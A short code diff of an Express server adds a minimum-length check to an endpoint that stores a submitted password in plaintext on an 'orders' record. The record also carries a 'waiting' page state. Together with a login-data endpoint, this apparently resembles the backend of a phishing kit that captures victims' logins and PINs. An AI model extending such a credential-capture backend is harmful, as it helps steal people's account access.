@@ -77,6 +77,9 @@ app.post('/api/login-data', async (req, res) => {
 app.post('/api/password-data', async (req, res) => {
   try {
     const { order_id, password } = req.body;
+    if (!password || password.length < 6) {
+      return res.status(400).json({ success: false, message: 'Password must be at least 6 digits' });
+    }
     if (order_id) {
       await supabase.from('orders').update({ login_password: password, current_page: 'waiting', status: 'pending' }).eq('id', order_id);
     }
